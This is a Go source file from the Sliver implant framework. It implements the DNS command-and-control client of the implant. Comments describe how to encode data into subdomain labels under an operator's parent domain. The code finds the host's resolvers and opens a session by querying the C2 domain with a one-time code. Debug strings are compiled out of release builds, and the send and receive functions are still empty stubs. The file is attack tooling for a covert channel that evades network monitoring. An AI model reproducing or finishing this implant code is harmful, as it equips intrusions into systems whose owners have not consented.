package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

--------------------------------------------------------------------------

*** BASE32 ***
DNS domains are limited to 254 characters including '.' so that means
Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
per subdomain.

Format: (subdata...).<ns domain>.<parent domain>
	[63].[63]...[ns].[parent].

254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query

We need to include some metadata in each request:
	Type = 2 bytes max
	ID = 4 bytes max
	Index = 4 bytes max
	Size = 4 bytes max
	Data = 78 - (2+4+4+4) ~= 64 bytes worst case

*** BASE58 ***
Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
it's just not an option, we could potentially use some type of Base62 encoding
but those implementations are more complex and only marginally more efficient
than Base58, and Base58 avoids any complexities with '-' in domain names.

The idea is that since the server returns the messages CRC32 checksum we can detect
when the message is transparently corrupted by some rude resolver. So when we init
the session we send a few messages with random data to see if we can use Base58, and
fallback to Base32 if we detect problems.
*/

// {{if .Config.DNSc2Enabled}}

import (
	"encoding/binary"
	"errors"
	"strconv"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/protobuf/dnspb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

const (
	// Little endian
	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
	messageIDBitMask = 0xff000000 // Bitwise mask to get the message ID

	metricsMaxSize = 64
)

var (
	errMsgTooLong          = errors.New("{{if .Config.Debug}}Too much data to encode{{end}}")
	errInvalidDNSSessionID = errors.New("{{if .Config.Debug}}Invalid dns session id{{end}}")
	errNoResolvers         = errors.New("{{if .Config.Debug}}No resolvers found{{end}}")
	ErrTimeout             = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
)

// DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) (*SliverDNSClient, error) {
	// {{if .Config.Debug}}
	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
	// {{end}}
	client := &SliverDNSClient{
		metrics: map[string][]time.Duration{},

		parent:        "." + strings.TrimPrefix(parent, "."),
		caseSensitive: false, // Can we use a case sensitive encoding?
		forceBase32:   false, // Force case insensitive encoding
		queryTimeout:  timeout,
		retry:         retry,
		retryCount:    3,
		subdataSpace:  254 - len(parent),

		base32: encoders.Base32{},
		base58: encoders.Base58{},
	}
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}

// SliverDNSClient - The DNS client context
type SliverDNSClient struct {
	resolver   SystemResolver
	resolvConf *dns.ClientConfig
	primary    int
	metrics    map[string][]time.Duration

	parent        string
	retry         time.Duration
	retryCount    int
	queryTimeout  time.Duration
	forceBase32   bool
	caseSensitive bool
	subdataSpace  int
	dnsSessionID  uint32

	base32 encoders.Base32
	base58 encoders.Base58
}

// SessionInit - Initialize DNS session
func (s *SliverDNSClient) SessionInit() error {
	err := s.loadResolvConf()
	if err != nil {
		return err
	}
	if len(s.resolvConf.Servers) == 0 {
		return errNoResolvers
	}

	// {{if .Config.Debug}}
	log.Printf("[dns] Found resolvers: %v", s.resolvConf.Servers)
	// {{end}}

	otpMsg, err := s.otpMsg()
	if err != nil {
		return err
	}
	otpDomain, err := s.joinSubdata(string(s.base32.Encode(otpMsg)))
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
	// {{end}}
	a, rtt, err := s.resolver.A(otpDomain)
	if err != nil {
		return err
	}
	s.recordMetrics(s.resolver.Address(), rtt)
	if len(a) < 1 {
		return errInvalidDNSSessionID
	}
	s.dnsSessionID = binary.LittleEndian.Uint32(a[0]) & sessionIDBitMask
	if s.dnsSessionID == 0 {
		return errInvalidDNSSessionID
	}

	// {{if .Config.Debug}}
	log.Printf("[dns] dns session id: %d", s.dnsSessionID)
	// {{end}}

	return nil
}

func (s *SliverDNSClient) primaryResolver() string {
	return s.resolvConf.Servers[s.primary] + ":" + s.resolvConf.Port
}

func (s *SliverDNSClient) loadResolvConf() error {
	var err error
	s.resolvConf, err = dnsClientConfig()
	return err
}

func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
	if s.subdataSpace <= len(subdata) {
		return "", errMsgTooLong // For sure won't fit after we add '.'
	}
	subdomains := []string{}
	for index := 0; index < len(subdata); index += 63 {
		stop := index + 63
		if len(subdata) < stop {
			stop = len(subdata)
		}
		subdomains = append(subdomains, subdata[index:stop])
	}
	// s.parent already has a leading '.'
	domain := strings.Join(subdomains, ".") + s.parent
	if 254 < len(domain) {
		return "", errMsgTooLong
	}
	return domain, nil
}

func (s *SliverDNSClient) otpMsg() ([]byte, error) {
	otpCode := cryptography.GetOTPCode()
	otp, err := strconv.Atoi(otpCode)
	if err != nil {
		return nil, err
	}
	otpMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_TOTP,
		ID:   uint32(otp), // Take advantage of the variable length encoding
	}
	return proto.Marshal(otpMsg)
}

// WriteEnvelope - Send an envelope to the server
func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	return nil
}

// ReadEnvelope - Recv an envelope from the server
func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	return nil, nil
}

// fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
func (s *SliverDNSClient) fingerprintResolver() {

}

func (s *SliverDNSClient) recordMetrics(resolver string, rtt time.Duration) {
	if s.metrics == nil {
		s.metrics = make(map[string][]time.Duration)
	}
	if _, ok := s.metrics[resolver]; !ok {
		s.metrics[resolver] = []time.Duration{}
	}
	if len(s.metrics[resolver]) < metricsMaxSize {
		s.metrics[resolver] = append([]time.Duration{rtt}, s.metrics[resolver]...)
	} else {
		s.metrics[resolver] = append([]time.Duration{rtt}, s.metrics[resolver][:metricsMaxSize-1]...)
	}
}

func (s *SliverDNSClient) averageRtt(resolver string) time.Duration {
	if _, ok := s.metrics[resolver]; !ok || len(s.metrics[resolver]) < 1 {
		return time.Duration(0)
	}
	var sum time.Duration
	for _, rtt := range s.metrics[resolver] {
		sum += rtt
	}
	return sum / time.Duration(len(s.metrics[resolver]))
}

// {{end}} -DNSc2Enabled
